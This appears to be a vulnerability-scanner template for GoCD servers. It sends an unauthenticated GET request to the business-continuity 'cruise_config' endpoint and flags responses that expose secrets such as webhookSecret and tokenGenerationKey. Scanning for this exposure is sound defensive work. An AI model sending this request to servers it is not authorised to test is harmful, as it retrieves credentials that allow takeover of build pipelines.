id: gocd-server-configuration

info:
  name: GoCd Server Configuration
  author: dhiyaneshDk
  severity: high
  reference: https://attackerkb.com/topics/ShpnUFlqDz/pre-auth-takeover-of-build-pipelines-in-gocd
  tags: go,lfi,gocd

requests:
  - method: GET
    path:
      - "{{BaseURL}}/go/add-on/business-continuity/api/cruise_config"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "server agentAutoRegisterKey"
          - "webhookSecret"
          - "tokenGenerationKey"
        part: body
